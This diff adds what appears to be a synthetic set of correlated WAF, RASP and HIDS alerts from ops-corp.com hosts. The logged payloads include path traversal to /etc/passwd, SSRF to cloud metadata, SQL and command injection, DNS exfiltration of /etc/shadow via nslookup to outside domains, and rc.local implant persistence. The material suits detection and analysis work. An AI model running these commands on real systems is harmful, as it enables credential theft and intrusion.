@@ -1,0 +1,91 @@
+1. `2026-05-28 14:49:01` **[waf]** `WAF0190932`
+    `/public/plugins/alertlist/../../../etc/passwd Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KH`
+2. `2026-05-28 14:49:02` **[web]** `WEB0192222`
+    `/public/plugins/alertlist/../../../etc/passwd Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KH`
+3. `2026-05-28 14:49:03` **[rasp]** `RASP0211223`
+    `https://app-nginx-59.ops-corp.com/public/plugins/alertlist/../../../etc/passwd {"cmd": "/public/plugins/alertl`
+4. `2026-05-28 14:50:31` **[hids]** `HID0207793`
+    `for line in $(cat /etc/shadow | base64 -w0 | fold -w 30); do nslookup $svc-2f623.system.org; done for for line`
+
+1. `2026-05-28 22:51:33` **[waf]** `WAF0193272`
+    `/api/fetch?url=http://169.254.169.254/latest/meta-data/ Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleW`
+2. `2026-05-28 22:51:34` **[web]** `WEB0194490`
+    `/api/fetch?url=http://169.254.169.254/latest/meta-data/ Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleW`
+3. `2026-05-28 22:51:35` **[rasp]** `RASP0213807`
+    `https://app-node-173.ops-corp.com/api/fetch?url=http://169.254.169.254/latest/meta-data/ {"cmd": "url=http://1`
+4. `2026-05-28 22:53:03` **[hids]** `HID0210069`
+    `for line in $(cat /etc/shadow | base64 -w0 | fold -w 30); do nslookup $node-602.host.com; done for for line in`
+
+1. `2026-05-29 01:41:29` **[waf]** `WAF0194114`
+    `/public/plugins/alertlist/../../../../etc/passwd Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/454`
+2. `2026-05-29 01:41:30` **[web]** `WEB0195335`
+    `/public/plugins/alertlist/../../../../etc/passwd Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/454`
+3. `2026-05-29 01:41:31` **[rasp]** `RASP0214716`
+    `https://app-nginx-102.ops-corp.com/public/plugins/alertlist/../../../../etc/passwd {"cmd": "/public/plugins/al`
+4. `2026-05-29 01:42:59` **[hids]** `HID0210856`
+    `for line in $(cat /etc/shadow | base64 -w0 | fold -w 30); do nslookup $44314c92.ops309.com; done for for line `
+
+1. `2026-05-29 13:58:04` **[waf]** `WAF0197633`
+    `/api/v1/dags/run?cmd_inject=;id script=throw+new+Exception("id".execute().text) Mozilla/5.0 (iPhone; CPU iPhon`
+2. `2026-05-29 13:58:05` **[web]** `WEB0198937`
+    `/api/v1/dags/run?cmd_inject=;id script=throw+new+Exception("id".execute().text) Mozilla/5.0 (iPhone; CPU iPhon`
+3. `2026-05-29 13:58:06` **[rasp]** `RASP0218697`
+    `https://app-django-176.ops-corp.com/api/v1/dags/run?cmd_inject=;id {"cmd_inject": ";id"} Mozilla/5.0 (iPhone; `
+4. `2026-05-29 13:59:34` **[hids]** `HID0214473`
+    `for line in $(cat /etc/shadow | base64 -w0 | fold -w 30); do nslookup $df9167.log-358.net; done for for line i`
+
+1. `2026-05-29 21:59:25` **[waf]** `WAF0200039`
+    `/api/fetch?url=http://169.254.169.254/latest/meta-data/ Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/`
+2. `2026-05-29 21:59:26` **[web]** `WEB0201341`
+    `/api/fetch?url=http://169.254.169.254/latest/meta-data/ Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/`
+3. `2026-05-29 21:59:27` **[rasp]** `RASP0221307`
+    `https://app-node-17.ops-corp.com/api/fetch?url=http://169.254.169.254/latest/meta-data/ {"cmd": "url=http://16`
+4. `2026-05-29 22:00:55` **[hids]** `HID0216784`
+    `for line in $(cat /etc/shadow | base64 -w0 | fold -w 30); do nslookup $node-623.cloud.io; done for for line in`
+
+1. `2026-05-01 01:09:59` **[waf]** `WAF0000272`
+    `/public/../../../etc/passwd cache_key=../../../tmp/fc04ac Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit`
+2. `2026-05-01 01:10:00` **[web]** `WEB0000267`
+    `/public/../../../etc/passwd cache_key=../../../tmp/fc04ac Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit`
+3. `2026-05-01 01:10:01` **[rasp]** `RASP0000266`
+    `https://app-node-67.ops-corp.com/public/../../../etc/passwd {"smuggle": "GET / HTTP/1.1", "cmd": "url=http://1`
+4. `2026-05-01 01:11:59` **[hids]** `HID0000310`
+    `sed -i "s/exit 0/\/tmp\/.svc -d\nexit 0/" /etc/rc.local sed sed -i "s/exit 0/\/tmp\/.svc -d\nexit 0/" /etc/rc.`
+
+1. `2026-05-01 10:21:53` **[waf]** `WAF0002772`
+    `/index.php/fpm_path?cmd=id id=1; EXEC master..xp_dirtree '\\sync-466.metric.net\share'-- Mozilla/5.0 (X11; Ubu`
+2. `2026-05-01 10:21:54` **[web]** `WEB0002764`
+    `/index.php/fpm_path?cmd=id id=1; EXEC master..xp_dirtree '\\sync-466.metric.net\share'-- Mozilla/5.0 (X11; Ubu`
+3. `2026-05-01 10:21:55` **[rasp]** `RASP0002931`
+    `https://app-nginx-92.ops-corp.com/index.php/fpm_path?cmd=id {"cmd": "id"} Mozilla/5.0 (X11; Ubuntu; Linux x86_`
+4. `2026-05-01 10:23:53` **[hids]** `HID0002965`
+    `echo "/tmp/.implant &" >> /etc/rc.local echo echo "/tmp/.implant &" >> /etc/rc.local <== /bin/dash -c 'echo "/`
+
+1. `2026-05-01 13:32:12` **[waf]** `WAF0003691`
+    `/static/../../../etc/passwd?path=/etc/passwd mount -t overlay overlay -o lowerdir=/lower,upperdir=/tmp/26ef4d/`
+2. `2026-05-01 13:32:13` **[web]** `WEB0003706`
+    `/static/../../../etc/passwd?path=/etc/passwd mount -t overlay overlay -o lowerdir=/lower,upperdir=/tmp/26ef4d/`
+3. `2026-05-01 13:32:14` **[rasp]** `RASP0003945`
+    `https://app-node-186.ops-corp.com/static/../../../etc/passwd?path=/etc/passwd {"path": "/etc/passwd"} Mozilla/`
+4. `2026-05-01 13:34:12` **[hids]** `HID0003875`
+    `sed -i "s/exit 0/\/tmp\/.svc -d\nexit 0/" /etc/rc.local sed sed -i "s/exit 0/\/tmp\/.svc -d\nexit 0/" /etc/rc.`
+
+1. `2026-05-02 02:18:19` **[waf]** `WAF0007450`
+    `/cgi-bin/.%2e/.%2e/bin/sh?cmd=echo;id id=1; EXEC xp_cmdshell('id')-- Mozilla/5.0 (Linux; Android 14; Pixel 8) `
+2. `2026-05-02 02:18:20` **[web]** `WEB0007555`
+    `/cgi-bin/.%2e/.%2e/bin/sh?cmd=echo;id id=1; EXEC xp_cmdshell('id')-- Mozilla/5.0 (Linux; Android 14; Pixel 8) `
+3. `2026-05-02 02:18:21` **[rasp]** `RASP0008125`
+    `https://app-php-201.ops-corp.com/cgi-bin/.%2e/.%2e/bin/sh?cmd=echo;id {"cmd": "echo;id"} Mozilla/5.0 (Linux; A`
+4. `2026-05-02 02:19:49` **[hids]** `HID0007462`
+    `cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/dash -c 'cat /etc/passwd' <== /usr/bin/php-cgi -b 127.0.0.1:`
+5. `2026-05-02 02:20:19` **[hids]** `HID0007465`
+    `echo "/tmp/.implant &" >> /etc/rc.local echo echo "/tmp/.implant &" >> /etc/rc.local <== /bin/dash -c 'echo "/`
+
+1. `2026-05-02 04:43:57` **[waf]** `WAF0008140`
+    `/api/posts?order=id;SELECT sleep(5)-- _method=__construct&filter[]=system&method=GET&server[REQUEST_METHOD]=id`
+2. `2026-05-02 04:43:58` **[web]** `WEB0008267`
+    `/api/posts?order=id;SELECT sleep(5)-- _method=__construct&filter[]=system&method=GET&server[REQUEST_METHOD]=id`
+3. `2026-05-02 04:43:59` **[rasp]** `RASP0008919`
+    `https://app-rails-210.ops-corp.com/api/posts?order=id;SELECT sleep(5)-- {"path_traversal": "../config/database`
+4. `2026-05-02 04:45:57` **[hids]** `HID0008112`
+    `echo "/tmp/.implant &" >> /etc/rc.local echo echo "/tmp/.implant &" >> /etc/rc.local <== /bin/sh -c 'echo "/tm`
